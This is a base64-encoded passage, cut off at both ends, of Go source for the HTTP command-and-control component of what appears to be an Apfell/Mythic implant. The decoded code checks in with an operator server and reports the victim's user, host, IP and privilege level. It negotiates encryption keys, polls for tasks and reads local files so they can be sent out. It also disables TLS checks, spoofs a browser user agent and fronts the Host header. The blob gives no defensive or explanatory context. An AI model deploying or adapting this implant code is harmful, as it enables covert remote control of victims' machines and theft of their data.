gaml0dGVyCn0KCmZ1bmMgKGMgQzJEZWZhdWx0KSBBcGZJRCgpIHN0cmluZyB7CglyZXR1cm4gYy5BcGZlbGxJRAp9CgpmdW5jIChjICpDMkRlZmF1bHQpIFNldEFwZmVsbElEKG5ld0FwZiBzdHJpbmcpIHsKCWMuQXBmZWxsSUQgPSBuZXdBcGYKfQoKZnVuYyAoYyBDMkRlZmF1bHQpIFByb2ZpbGVUeXBlKCkgc3RyaW5nIHsKCXQgOj0gcmVmbGVjdC5UeXBlT2YoYykKCXJldHVybiB0Lk5hbWUoKQp9CgovL0NoZWNrSW4gYSBuZXcgYWdlbnQKZnVuYyAoYyAqQzJEZWZhdWx0KSBDaGVja0luKGlwIHN0cmluZywgcGlkIGludCwgdXNlciBzdHJpbmcsIGhvc3Qgc3RyaW5nLCBvcGVyYXRpbmdzeXN0ZW0gc3RyaW5nLCBhcmNoIHN0cmluZykgaW50ZXJmYWNle30gewoJdmFyIHJlc3AgW11ieXRlCgkvLyBTZXQgdGhlIEMyIFByb2ZpbGUgdmFsdWVzCgljLkJhc2VVUkwgPSBDb25maWcuQmFzZVVSTAoJYy5JbnRlcnZhbCA9IENvbmZpZy5TbGVlcAoJYy5KaXR0ZXIgPSBDb25maWcuSml0dGVyCglpZiBzdHJpbmdzLkNvbnRhaW5zKENvbmZpZy5LRVlYLCAiVCIpIHsKCQljLkV4Y2hhbmdpbmdLZXlzID0gdHJ1ZQoJfSBlbHNlIHsKCQljLkV4Y2hhbmdpbmdLZXlzID0gZmFsc2UKCX0KCglpZiBsZW4oQ29uZmlnLktleSkgPiAwIHsKCQljLktleSA9IENvbmZpZy5LZXkKCX0gZWxzZSB7CgkJYy5LZXkgPSAiIgoJfQoKCWlmIGxlbihDb25maWcuSG9zdEhlYWRlcikgPiAwIHsKCQljLkhvc3RIZWFkZXIgPSBDb25maWcuSG9zdEhlYWRlcgoJfQoKCWlmIGxlbihDb25maWcuVXNlckFnZW50KSA+IDAgewoJCWMuVXNlckFnZW50ID0gQ29uZmlnLlVzZXJBZ2VudAoJfSBlbHNlIHsKCQljLlVzZXJBZ2VudCA9ICJNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBVOyBJbnRlbCBNYWMgT1MgWDsgZW4pIEFwcGxlV2ViS2l0LzQxOS4zIChLSFRNTCwgbGlrZSBHZWNrbykgU2FmYXJpLzQxOS4zIgoJfQoKCWMuVVVJRCA9IFVVSUQKCWMuQXBmZWxsSUQgPSBjLlVVSUQKCWNoZWNraW4gOj0gc3RydWN0cy5DaGVja0luTWVzc2FnZXt9CgljaGVja2luLkFjdGlvbiA9ICJjaGVja2luIgoJY2hlY2tpbi5Vc2VyID0gdXNlcgoJY2hlY2tpbi5Ib3N0ID0gaG9zdAoJY2hlY2tpbi5JUCA9IGlwCgljaGVja2luLlBpZCA9IHBpZAoJY2hlY2tpbi5VVUlEID0gYy5VVUlECgljaGVja2luLk9TID0gb3BlcmF0aW5nc3lzdGVtCgljaGVja2luLkFyY2hpdGVjdHVyZSA9IGFyY2gKCWlmIGZ1bmN0aW9ucy5Jc0VsZXZhdGVkKCkgewoJCWNoZWNraW4uSW50ZWdyaXR5TGV2ZWwgPSAzCgl9IGVsc2UgewoJCWNoZWNraW4uSW50ZWdyaXR5TGV2ZWwgPSAyCgl9CgoJaWYgYy5FeGNoYW5naW5nS2V5cyB7IC8vIElmIGV4Y2hhbmdpbmdLZXlzID09IHRydWUsIHRoZW4gc3RhcnQgRUtFCgkJXyA9IGMuTmVnb3RpYXRlS2V5KCkKCX0KCglyYXcsIF8gOj0ganNvbi5NYXJzaGFsKGNoZWNraW4pCgllbmRwb2ludCA6PSBmbXQuU3ByaW50ZigiYXBpL3Ylcy9hZ2VudF9tZXNzYWdlIiwgQXBpVmVyc2lvbikKCXJlc3AgPSBjLmh0bWxQb3N0RGF0YShlbmRwb2ludCwgcmF3KQoKCS8vIHNhdmUgdGhlIGFwZmVsbCBpZAoJcmVzcG9uc2UgOj0gc3RydWN0cy5DaGVja0luTWVzc2FnZVJlc3BvbnNle30KCWVyciA6PSBqc29uLlVubWFyc2hhbChyZXNwLCAmcmVzcG9uc2UpCgoJaWYgZXJyICE9IG5pbCB7CgkJLy9sb2cuUHJpbnRmKCJFcnJvciBpbiB1bm1hcnNoYWw6XG4gJXMiLCBlcnIuRXJyb3IoKSkKCX0KCglpZiBsZW4ocmVzcG9uc2UuSUQpICE9IDAgewoJCS8vbG9nLlByaW50ZigiU2F2aW5nIG5ldyBVVUlEOiAlc1xuIiwgcmVzcG9uc2UuSUQpCgkJYy5BcGZlbGxJRCA9IHJlc3BvbnNlLklECgl9CgoJcmV0dXJuIHJlc3BvbnNlCn0KCi8vTmVnb3RpYXRlS2V5IC0gRUtFIGtleSBuZWdvdGlhdGlvbgpmdW5jIChjICpDMkRlZmF1bHQpIE5lZ290aWF0ZUtleSgpIHN0cmluZyB7CiAgICBzZXNzaW9uSUQgOj0gR2VuZXJhdGVTZXNzaW9uSUQoKQoJcHViLCBwcml2IDo9IGNyeXB0by5HZW5lcmF0ZVJTQUtleVBhaXIoKQoJYy5Sc2FQcml2YXRlS2V5ID0gcHJpdgoJLy8gUmVwbGFjZSBzdHJ1Y3Qgd2l0aCBkeW5hbWljIGpzb24KCWluaXRNZXNzYWdlIDo9IHN0cnVjdHMuRWtlS2V5RXhjaGFuZ2VNZXNzYWdle30KCWluaXRNZXNzYWdlLkFjdGlvbiA9ICJzdGFnaW5nX3JzYSIKCWluaXRNZXNzYWdlLlNlc3Npb25JRCA9IHNlc3Npb25JRAoJaW5pdE1lc3NhZ2UuUHViS2V5ID0gYmFzZTY0LlN0ZEVuY29kaW5nLkVuY29kZVRvU3RyaW5nKHB1YikKCgkvLyBFbmNvZGUgYW5kIGVuY3J5cHQgdGhlIGpzb24gbWVzc2FnZQoJcmF3LCBlcnIgOj0ganNvbi5NYXJzaGFsKGluaXRNZXNzYWdlKQogICAgLy9sb2cuUHJpbnRsbih1bmVuY3J5cHRlZE1zZykKCWlmIGVyciAhPSBuaWwgewoJCXJldHVybiAiIgoJfQoKCWVuZHBvaW50IDo9IGZtdC5TcHJpbnRmKCJhcGkvdiVzL2FnZW50X21lc3NhZ2UiLCBBcGlWZXJzaW9uKSAvLyBTZW5kIHRoZSByZXF1ZXN0IHRvIHRoZSBFS0UgZW5kcG9pbnQKCglyZXNwIDo9IGMuaHRtbFBvc3REYXRhKGVuZHBvaW50LCByYXcpCgkvLyBEZWNyeXB0ICYgVW5tYXJzaGFsIHRoZSByZXNwb25zZQoKCXNlc3Npb25LZXlSZXNwIDo9IHN0cnVjdHMuRWtlS2V5RXhjaGFuZ2VNZXNzYWdlUmVzcG9uc2V7fQoKCWVyciA9IGpzb24uVW5tYXJzaGFsKHJlc3AsICZzZXNzaW9uS2V5UmVzcCkKCWlmIGVyciAhPSBuaWwgewoJCS8vbG9nLlByaW50ZigiRXJyb3IgdW5tYXJzaGFsaW5nIGVrZSByZXNwb25zZTogJXNcbiIsIGVyci5FcnJvcigpKQoJCXJldHVybiAiIgoJfQoKCWVuY3J5cHRlZFNlc3Npb25LZXksIF8gOj0gYmFzZTY0LlN0ZEVuY29kaW5nLkRlY29kZVN0cmluZyhzZXNzaW9uS2V5UmVzcC5TZXNzaW9uS2V5KQoJZGVjcnlwdGVkS2V5IDo9IGNyeXB0by5Sc2FEZWNyeXB0Q2lwaGVyQnl0ZXMoZW5jcnlwdGVkU2Vzc2lvbktleSwgYy5Sc2FQcml2YXRlS2V5KQoJYy5LZXkgPSBiYXNlNjQuU3RkRW5jb2RpbmcuRW5jb2RlVG9TdHJpbmcoZGVjcnlwdGVkS2V5KSAvLyBTYXZlIHRoZSBuZXcgQUVTIHNlc3Npb24ga2V5CgljLkV4Y2hhbmdpbmdLZXlzID0gZmFsc2UKCglpZiBsZW4oc2Vzc2lvbktleVJlc3AuVVVJRCkgPiAwIHsKCQljLkFwZmVsbElEID0gc2Vzc2lvbktleVJlc3AuVVVJRCAvLyBTYXZlIHRoZSBuZXcgVVVJRAoJfQoKCXJldHVybiBzZXNzaW9uSUQKfQoKLy9HZXRUYXNraW5nIC0gcmV0cmlldmUgbmV3IHRhc2tzCmZ1bmMgKGMgKkMyRGVmYXVsdCkgR2V0VGFza2luZygpIGludGVyZmFjZXt9IHsKCXVybCA6PSBmbXQuU3ByaW50ZigiJXNhcGkvdiVzL2FnZW50X21lc3NhZ2UiLCBjLkJhc2VVUkwsIEFwaVZlcnNpb24pCgkvL3JlcXVlc3QgOj0gc3RydWN0cy5Nc2d7fQoJcmVxdWVzdCA6PSBzdHJ1Y3RzLlRhc2tSZXF1ZXN0TWVzc2FnZXt9CglyZXF1ZXN0LkFjdGlvbiA9ICJnZXRfdGFza2luZyIKCXJlcXVlc3QuVGFza2luZ1NpemUgPSAtMQoKCXJhdywgZXJyIDo9IGpzb24uTWFyc2hhbChyZXF1ZXN0KQoKCWlmIGVyciAhPSBuaWwgewoJCS8vbG9nLlByaW50ZigiRXJyb3IgdW5tYXJzaGFsbGluZzogJXMiLCBlcnIuRXJyb3IoKSkKCX0KCglyYXdUYXNrIDo9IGMuaHRtbEdldERhdGEodXJsLCByYXcpCgoJdGFzayA6PSBzdHJ1Y3RzLlRhc2tSZXF1ZXN0TWVzc2FnZVJlc3BvbnNle30KCWVyciA9IGpzb24uVW5tYXJzaGFsKHJhd1Rhc2ssICZ0YXNrKQoKCWlmIGVyciAhPSBuaWwgewoJCS8vbG9nLlByaW50ZigiRXJyb3IgdW5tYXJzaGFsbGluZyB0YXNrIGRhdGE6ICVzIiwgZXJyLkVycm9yKCkpCgl9CgoJcmV0dXJuIHRhc2sKfQoKLy9Qb3N0UmVzcG9uc2UgLSBQb3N0IHRhc2sgcmVzcG9uc2VzCmZ1bmMgKGMgKkMyRGVmYXVsdCkgUG9zdFJlc3BvbnNlKG91dHB1dCBbXWJ5dGUsIHNraXBDaHVua2luZyBib29sKSBbXWJ5dGUgewoJZW5kcG9pbnQgOj0gZm10LlNwcmludGYoImFwaS92JXMvYWdlbnRfbWVzc2FnZSIsIEFwaVZlcnNpb24pCglpZiAhc2tpcENodW5raW5nIHsKCQlyZXR1cm4gYy5wb3N0UkVTVFJlc3BvbnNlKGVuZHBvaW50LCBvdXRwdXQpCgl9IGVsc2UgewoJCXJldHVybiBjLmh0bWxQb3N0RGF0YShlbmRwb2ludCwgb3V0cHV0KQoJfQoKfQoKLy9wb3N0UkVTVFJlc3BvbnNlIC0gV3JhcHBlciB0byBwb3N0IHRhc2sgcmVzcG9uc2VzIHRocm91Z2ggdGhlIEFwZmVsbCByZXN0IEFQSQpmdW5jIChjICpDMkRlZmF1bHQpIHBvc3RSRVNUUmVzcG9uc2UodXJsRW5kaW5nIHN0cmluZywgZGF0YSBbXWJ5dGUpIFtdYnl0ZSB7CglzaXplIDo9IGxlbihkYXRhKQoJY29uc3QgZGF0YUNodW5rID0gNTEyMDAwIC8vTm9ybWFsIGFwZmVsbCBjaHVuayBzaXplCglyIDo9IGJ5dGVzLk5ld0J1ZmZlcihkYXRhKQoJY2h1bmtzIDo9IHVpbnQ2NChtYXRoLkNlaWwoZmxvYXQ2NChzaXplKSAvIGRhdGFDaHVuaykpCgl2YXIgcmV0RGF0YSBieXRlcy5CdWZmZXIKCS8vbG9nLlByaW50bG4oIkNodW5rczogIiwgY2h1bmtzKQoJZm9yIGkgOj0gdWludDY0KDApOyBpIDwgY2h1bmtzOyBpKysgewoJCWRhdGFQYXJ0IDo9IGludChtYXRoLk1pbihkYXRhQ2h1bmssIGZsb2F0NjQoaW50NjQoc2l6ZSktaW50NjQoaSpkYXRhQ2h1bmspKSkpCgkJZGF0YUJ1ZmZlciA6PSBtYWtlKFtdYnl0ZSwgZGF0YVBhcnQpCgoJCV8sIGVyciA6PSByLlJlYWQoZGF0YUJ1ZmZlcikKCQlpZiBlcnIgIT0gbmlsIHsKCQkJLy9mbXQuU3ByaW50ZigiRXJyb3IgcmVhZGluZyAlczogJXMiLCBlcnIpCgkJCWJyZWFrCgkJfQoKCQlyZXNwb25zZU1zZyA6PSBzdHJ1Y3RzLlRhc2tSZXNwb25zZU1lc3NhZ2V7fQoJCXJlc3BvbnNlTXNnLkFjdGlvbiA9ICJwb3N0X3Jlc3BvbnNlIgoJCXJlc3BvbnNlTXNnLlJlc3BvbnNlcyA9IG1ha2UoW11qc29uLlJhd01lc3NhZ2UsIDEpCgkJcmVzcG9uc2VNc2cuUmVzcG9uc2VzWzBdID0gZGF0YUJ1ZmZlcgoKCQlkYXRhVG9TZW5kLCBlcnIgOj0ganNvbi5NYXJzaGFsKHJlc3BvbnNlTXNnKQoJCWlmIGVyciAhPSBuaWwgewoJCQkvL2xvZy5QcmludGYoIkVycm9yIG1hcnNoYWxpbmcgZGF0YSBmb3IgcG9zdFJFU1RSZXNwb25zZTogJXMiLCBlcnIuRXJyb3IoKSkKCQkJcmV0dXJuIG1ha2UoW11ieXRlLCAwKQoJCX0KCQlyZXQgOj0gYy5odG1sUG9zdERhdGEodXJsRW5kaW5nLCBkYXRhVG9TZW5kKQoJCXJldERhdGEuV3JpdGUocmV0KQoJfQoKCXJldHVybiByZXREYXRhLkJ5dGVzKCkKfQoKLy9odG1sUG9zdERhdGEgSFRUUCBQT1NUIGZ1bmN0aW9uCmZ1bmMgKGMgKkMyRGVmYXVsdCkgaHRtbFBvc3REYXRhKHVybEVuZGluZyBzdHJpbmcsIHNlbmREYXRhIFtdYnl0ZSkgW11ieXRlIHsKCXVybCA6PSBmbXQuU3ByaW50ZigiJXMlcyIsIGMuQmFzZVVSTCwgdXJsRW5kaW5nKQoJLy9sb2cuUHJpbnRsbigiU2VuZGluZyBQT1NUIHJlcXVlc3QgdG8gdXJsOiAiLCB1cmwpCgkvLyBJZiB0aGUgQWVzUFNLIGlzIHNldCwgZW5jcnlwdCB0aGUgZGF0YSB3ZSBzZW5kCglpZiBsZW4oYy5LZXkpICE9IDAgewoJCS8vbG9nLlByaW50ZigiRW5jcnlwdGluZyBQb3N0IGRhdGEiKQoJCXNlbmREYXRhID0gYy5lbmNyeXB0TWVzc2FnZShzZW5kRGF0YSkKCX0KCXNlbmREYXRhID0gYXBwZW5kKFtdYnl0ZShjLkFwZmVsbElEKSwgc2VuZERhdGEuLi4pIC8vIFByZXBlbmQgdGhlIFVVSUQKCXNlbmREYXRhID0gW11ieXRlKGJhc2U2NC5TdGRFbmNvZGluZy5FbmNvZGVUb1N0cmluZyhzZW5kRGF0YSkpIC8vIEJhc2U2NCBlbmNvZGUgYW5kIGNvbnZlcnQgdG8gcmF3IGJ5dGVzCglyZXEsIGVyciA6PSBodHRwLk5ld1JlcXVlc3QoIlBPU1QiLCB1cmwsIGJ5dGVzLk5ld0J1ZmZlcihzZW5kRGF0YSkpCglpZiBlcnIgIT0gbmlsIHsKCQkvL2xvZy5QcmludGYoIkVycm9yIGNyZWF0aW5nIG5ldyBodHRwIHJlcXVlc3Q6ICVzIiwgZXJyLkVycm9yKCkpCgkJcmV0dXJuIG1ha2UoW11ieXRlLCAwKQoJfQoJY29udGVudExlbmd0aCA6PSBsZW4oc2VuZERhdGEpCglyZXEuQ29udGVudExlbmd0aCA9IGludDY0KGNvbnRlbnRMZW5ndGgpCglyZXEuSGVhZGVyLlNldCgiVXNlci1BZ2VudCIsIGMuVXNlckFnZW50KQoJLy8gU2V0IHRoZSBob3N0IGhlYWRlciBpZiBub3QgZW1wdHkKCWlmIGxlbihjLkhvc3RIZWFkZXIpID4gMCB7CgkJLy9yZXEuSGVhZGVyLlNldCgiSG9zdCIsIGMuSG9zdEhlYWRlcikKCQlyZXEuSG9zdCA9IGMuSG9zdEhlYWRlcgoJfQoJLy8gbG9vcCBoZXJlIHVudGlsIHdlIGNhbiBnZXQgb3VyIGRhdGEgdG8gZ28gdGhyb3VnaCBwcm9wZXJseQogICAgZm9yIHRydWV7CiAgICAgICAgdHIgOj0gJmh0dHAuVHJhbnNwb3J0ewoJCQlUTFNDbGllbnRDb25maWc6ICZ0bHMuQ29uZmlne0luc2VjdXJlU2tpcFZlcmlmeTogdHJ1ZX0sCgkJfQoJCQoJCWNsaWVudCA6PSAmaHR0cC5DbGllbnR7CgkJCVRpbWVvdXQ6IDMwICogdGltZS5TZWNvbmQsCgkJCVRyYW5zcG9ydDogdHIsCgkJfQoJICAgIHJlc3AsIGVyciA6PSBjbGllbnQuRG8ocmVxKQoJICAgIGlmIGVyciAhPSBuaWwgewoJICAgICAgICAvL3RpbWUuU2xlZXAodGltZS5EdXJhdGlvbihjLlNsZWVwSW50ZXJ2YWwoKSkgKiB0aW1lLlNlY29uZCkKCSAgICAgICAgdGltZS5TbGVlcCh0aW1lLkR1cmF0aW9uKGMuZ2V0U2xlZXBUaW1lKCkpICogdGltZS5TZWNvbmQpOwogICAgICAgICAgICBjb250aW51ZQoJCX0KCiAgICAgICAgaWYgcmVzcC5TdGF0dXNDb2RlICE9IDIwMCB7CiAgICAgICAgICAgIHRpbWUuU2xlZXAodGltZS5EdXJhdGlvbihjLmdldFNsZWVwVGltZSgpKSAqIHRpbWUuU2Vjb25kKTsKICAgICAgICAgICAgLy90aW1lLlNsZWVwKHRpbWUuRHVyYXRpb24oYy5TbGVlcEludGVydmFsKCkpICogdGltZS5TZWNvbmQpCiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgfQoKICAgICAgICBkZWZlciByZXNwLkJvZHkuQ2xvc2UoKQoKICAgICAgICBib2R5LCBlcnIgOj0gaW91dGlsLlJlYWRBbGwocmVzcC5Cb2R5KQoKICAgICAgICBpZiBlcnIgIT0gbmlsIHsKICAgICAgICAgICAgdGltZS5TbGVlcCh0aW1lLkR1cmF0aW9uKGMuZ2V0U2xlZXBUaW1lKCkpICogdGltZS5TZWNvbmQpOwogICAgICAgICAgICAvL3RpbWUuU2xlZXAodGltZS5EdXJhdGlvbihjLlNsZWVwSW50ZXJ2YWwoKSkgKiB0aW1lLlNlY29uZCkKICAgICAgICAgICAgY29udGludWUKCQl9CgoJCXJhdywgZXJyIDo9IGJhc2U2NC5TdGRFbmNvZGluZy5EZWNvZGVTdHJpbmcoc3RyaW5nKGJvZHkpKQoJCWlmIGVyciAhPSBuaWwgewoJCQkvL2xvZy5QcmludGxuKCJFcnJvciBkZWNvZGluZyBiYXNlNjQgZGF0YTogIiwgZXJyLkVycm9yKCkpCgkJCXJldHVybiBtYWtlKFtdYnl0ZSwgMCkKCQl9CgoJCWlmIGxlbihyYXcpID09IDAgewoJCQl0aW1lLlNsZWVwKHRpbWUuRHVyYXRpb24oYy5nZXRTbGVlcFRpbWUoKSkgKiB0aW1lLlNlY29uZCk7CiAgICAgICAgICAgIGNvbnRpbnVlCgkJfQoKCQllbmNfcmF3IDo9IHJhd1szNjpdIC8vIFJlbW92ZSB0aGUgUGF5bG9hZCBVVUlECiAgICAgICAgLy8gaWYgdGhlIEFlc1BTSyBpcyBzZXQgYW5kIHdlJ3JlIG5vdCBpbiB0aGUgbWlkc3Qgb2YgdGhlIGtleSBleGNoYW5nZSwgZGVjcnlwdCB0aGUgcmVzcG9uc2UKICAgICAgICBpZiBsZW4oYy5LZXkpICE9IDAgewogICAgICAgICAgICAvL2xvZy5QcmludGxuKCJqdXN0IGRpZCBhIHBvc3QsIGFuZCBkZWNyeXB0aW5nIHRoZSBtZXNzYWdlIGJhY2siKQogICAgICAgICAgICBlbmNfcmF3ID0gYy5kZWNyeXB0TWVzc2FnZShlbmNfcmF3KQogICAgICAgICAgICAvL2xvZy5QcmludGxuKGVuY19yYXcpCiAgICAgICAgICAgIGlmIGxlbihlbmNfcmF3KSA9PSAwewogICAgICAgICAgICAgICAgLy8gZmFpbGVkIHNvbWVob3cgaW4gZGVjcnlwdGlvbgogICAgICAgICAgICAgICAgLy90aW1lLlNsZWVwKHRpbWUuRHVyYXRpb24oYy5TbGVlcEludGVydmFsKCkpICogdGltZS5TZWNvbmQpCiAgICAgICAgICAgICAgICB0aW1lLlNsZWVwKHRpbWUuRHVyYXRpb24oYy5nZXRTbGVlcFRpbWUoKSkgKiB0aW1lLlNlY29uZCk7CiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIC8vbG9nLlByaW50ZigiUmF3IGh0bWxwb3N0IHJlc3BvbnNlOiAlc1xuIiwgc3RyaW5nKGVuY19yYXcpKQogICAgICAgIHJldHVybiBlbmNfcmF3CiAgICB9CiAgICByZXR1cm4gbWFrZShbXWJ5dGUsIDApIC8vc2hvdWxkbid0IGdldCBoZXJlCn0KCi8vaHRtbEdldERhdGEgLSBIVFRQIEdFVCByZXF1ZXN0IGZvciBkYXRhCmZ1bmMgKGMgKkMyRGVmYXVsdCkgaHRtbEdldERhdGEodXJsIHN0cmluZywgYm9keSBbXWJ5dGUpIFtdYnl0ZSB7CgkvL2xvZy5QcmludGxuKCJTZW5kaW5nIEhUTUwgR0VUIHJlcXVlc3QgdG8gdXJsOiAiLCB1cmwpCgl0ciA6PSAmaHR0cC5UcmFuc3BvcnR7CiAgICAgICAgVExTQ2xpZW50Q29uZmlnOiAmdGxzLkNvbmZpZ3tJbnNlY3VyZVNraXBWZXJpZnk6IHRydWV9LAoJfQoJCgljbGllbnQgOj0gJmh0dHAuQ2xpZW50ewoJCVRpbWVvdXQ6IDMwICogdGltZS5TZWNvbmQsCgkJVHJhbnNwb3J0OiB0ciwKCX0KCXZhciByZXNwQm9keSBbXWJ5dGUKCiAgICBmb3IgdHJ1ZXsKCQlpZiBsZW4oYy5LZXkpID4gMCAmJiBsZW4oYm9keSkgPiAwIHsKCQkJYm9keSA9IGMuZW5jcnlwdE1lc3NhZ2UoYm9keSkgLy8gRW5jcnlwdCBhbmQgdGhlbiBlbmNhcHN1bGF0ZSB0aGUgdGFzayByZXF1ZXN0CgkJfQoJCWVuY2FwYm9keSA6PSBhcHBlbmQoW11ieXRlKGMuQXBmZWxsSUQpLCBib2R5Li4uKSAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gUHJlcGVuZCB0aGUgVVVJRCB0byB0aGUgYm9keSBvZiB0aGUgcmVxdWVzdAoJCWVuY2JvZHkgOj0gYmFzZTY0LlN0ZEVuY29kaW5nLkVuY29kZVRvU3RyaW5nKGVuY2FwYm9keSkgICAgICAgICAgICAgICAgICAgLy8gQmFzZTY0IHRoZSBib2R5CgogICAgICAgIHJlcSwgZXJyIDo9IGh0dHAuTmV3UmVxdWVzdCgiR0VUIiwgdXJsLCBieXRlcy5OZXdCdWZmZXIoW11ieXRlKGVuY2JvZHkpKSkKICAgICAgICBpZiBlcnIgIT0gbmlsIHsKICAgICAgICAgICAgLy90aW1lLlNsZWVwKHRpbWUuRHVyYXRpb24oYy5TbGVlcEludGVydmFsKCkpICogdGltZS5TZWNvbmQpCiAgICAgICAgICAgIHRpbWUuU2xlZXAodGltZS5EdXJhdGlvbihjLmdldFNsZWVwVGltZSgpKSAqIHRpbWUuU2Vjb25kKTsKICAgICAgICAgICAgY29udGludWUKICAgICAgICB9CgogICAgICAgIGlmIGxlbihjLkhvc3RIZWFkZXIpID4gMCB7CiAgICAgICAgICAgIC8vcmVxLkhlYWRlci5TZXQoIkhvc3QiLCBjLkhvc3RIZWFkZXIpCiAgICAgICAgICAgIHJlcS5Ib3N0ID0gYy5Ib3N0SGVhZGVyCiAgICAgICAgfQoKICAgICAgICByZXEuSGVhZGVyLlNldCgiVXNlci1BZ2VudCIsIGMuVXNlckFnZW50KQogICAgICAgIHJlc3AsIGVyciA6PSBjbGllbnQuRG8ocmVxKQoKICAgICAgICBpZiBlcnIgIT0gbmlsIHsKICAgICAgICAgICAgLy90aW1lLlNsZWVwKHRpbWUuRHVyYXRpb24oYy5TbGVlcEludGVydmFsKCkpICogdGltZS5TZWNvbmQpCiAgICAgICAgICAgIHRpbWUuU2xlZXAodGltZS5EdXJhdGlvbihjLmdldFNsZWVwVGltZSgpKSAqIHRpbWUuU2Vjb25kKTsKICAgICAgICAgICAgY29udGludWUKICAgICAgICB9CgogICAgICAgIGlmIHJlc3AuU3RhdHVzQ29kZSAhPSAyMDAgewogICAgICAgICAgICAvL3RpbWUuU2xlZXAodGltZS5EdXJhdGlvbihjLlNsZWVwSW50ZXJ2YWwoKSkgKiB0aW1lLlNlY29uZCkKICAgICAgICAgICAgdGltZS5TbGVlcCh0aW1lLkR1cmF0aW9uKGMuZ2V0U2xlZXBUaW1lKCkpICogdGltZS5TZWNvbmQpOwogICAgICAgICAgICBjb250aW51ZQogICAgICAgIH0KCiAgICAgICAgZGVmZXIgcmVzcC5Cb2R5LkNsb3NlKCkKCiAgICAgICAgcmVzcEJvZHksIF8gPSBpb3V0aWwuUmVhZEFsbChyZXNwLkJvZHkpCgkJcmF3LCBfIDo9IGJhc2U2NC5TdGRFbmNvZGluZy5EZWNvZGVTdHJpbmcoc3RyaW5nKHJlc3BCb2R5KSkKCQllbmNfcmF3IDo9IHJhd1szNjpdIC8vIFJlbW92ZSB0aGUgcHJlcGVuZGVkIFVVSUQKICAgICAgICBpZiBsZW4oYy5LZXkpICE9IDAgewogICAgICAgICAgICBlbmNfcmF3ID0gYy5kZWNyeXB0TWVzc2FnZShlbmNfcmF3KQogICAgICAgICAgICBpZiBsZW4oZW5jX3JhdykgPT0gMHsKICAgICAgICAgICAgICAgIC8vdGltZS5TbGVlcCh0aW1lLkR1cmF0aW9uKGMuU2xlZXBJbnRlcnZhbCgpKSAqIHRpbWUuU2Vjb25kKQogICAgICAgICAgICAgICAgdGltZS5TbGVlcCh0aW1lLkR1cmF0aW9uKGMuZ2V0U2xlZXBUaW1lKCkpICogdGltZS5TZWNvbmQpOwogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgfQoJCX0KCQkvL2xvZy5QcmludGYoIlJhdyBodG1sZ2V0IHJlc3BvbnNlOiAlc1xuIiwgc3RyaW5nKGVuY19yYXcpKQogICAgICAgIHJldHVybiBlbmNfcmF3CiAgICB9CiAgICByZXR1cm4gbWFrZShbXWJ5dGUsIDApIC8vc2hvdWxkbid0IGdldCBoZXJlCgp9CgovL1NlbmRGaWxlIC0gZG93bmxvYWQgYSBmaWxlCmZ1bmMgKGMgKkMyRGVmYXVsdCkgU2VuZEZpbGUodGFzayBzdHJ1Y3RzLlRhc2ssIHBhcmFtcyBzdHJpbmcsIGNoIGNoYW4gW11ieXRlKXsKCXBhdGggOj0gdGFzay5QYXJhbXMKCS8vIEdldCB0aGUgZmlsZSBzaXplIGZpcnN0IGFuZCB0aGVuIHRoZSAjIG9mIGNodW5rcyByZXF1aXJlZAoJZmlsZSwgZXJyIDo9IG9zLk9wZW4ocGF0aCkKCglpZiBlcnIgIT0gbmlsIHsKCQllcnJSZXNwb25zZSA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCQllcnJSZXNwb25zZS5Db21wbGV0ZWQgPSB0cnVlCgkJZXJyUmVzcG9uc2UuVGFza0lEID0gdGFzay5UYXNrSUQKCQllcnJSZXNwb25zZS5Vc2VyT3V0cHV0ID0gZm10LlNwcmludGYoIkVycm9yIG9wZW5pbmcgZmlsZTogJXMiLCBlcnIuRXJyb3IoKSkKCQllcnJSZXNwb25zZUVuYywgXyA6PSBqc29uLk1hcnNoYWwoZXJyUmVzcG9uc2UpCgkJbXUuTG9jaygpCgkJVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChUYXNrUmVzcG9uc2VzLCBlcnJSZXNwb25zZUVuYykKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoKCWZpLCBlcnIgOj0gZmlsZS5TdGF0KCkKCWlmIGVyciAhPSBuaWwgewoJCWVyclJlc3BvbnNlIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJCWVyclJlc3BvbnNlLkNvbXBsZXRlZCA9IHRydWUKCQllcnJSZXNwb25zZS5UYXNrSUQgPSB0YXNrLlRhc2tJRAoJCWVyclJlc3BvbnNlLlVzZXJPdXRwdXQgPSBmbXQuU3ByaW50ZigiRXJyb3IgZ2V0dGluZyBmaWxlIHNpemU6ICVzIiwgZXJyLkVycm9yKCkpCgkJZXJyUmVzcG9uc2VFbmMsIF8gOj0ganNvbi5NYXJzaGFsKGVyclJlc3BvbnNlKQoJCW11LkxvY2soKQoJCVRhc2tSZXNwb25zZXMgPSBhcHBlbmQoVGFza1Jlc3BvbnNlcywgZXJyUmVzcG9uc2VFbmMpCgkJbXUuVW5sb2NrKCkKCQlyZXR1cm4KCX0KCglzaXplIDo9IGZpLlNpemUoKQoJcmF3IDo9IG1ha2UoW11ieXRlLCBzaXplKQoJXywgZXJyID0gZmlsZS5SZWFkKHJhdykKCWlmIGVyciAhPSBuaWwgewoJCWVyclJlc3BvbnNlIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJCWVyclJlc3BvbnNlLkNvbXBsZXRlZCA9IHRydWUKCQllcnJSZXNwb25zZS5UYXNrSUQgPSB0YXNrLlRhc2tJRAoJCWVyclJlc3BvbnNlLlVzZXJPdXRwdXQgPSBmbXQuU3ByaW50ZigiRXJyb3IgcmVhZGluZyBmaWxlOiAlcyIsIGVyci5FcnJvcigpKQoJCWVyclJlc3BvbnNlRW5jLCBfIDo9IGpzb24uTWFyc2hhbChlcnJSZXNwb25zZSkKCQltdS5Mb2NrKCkKCQlUYXNrUmVzcG9uc2VzID0gYXBwZW5kKFRhc2tSZXNwb25zZXMsIGVyclJlc3BvbnNlRW5jKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CgoJXyA9IGZpbGUuQ2xvc2UoKQoKCWMuU2VuZEZpbGVDaHVua3ModGFzaywgcmF3LCBjaCkKfQoKLy8gR2V0IGEgZmlsZQoKZnVuYyAoYyAqQzJEZWZhdWx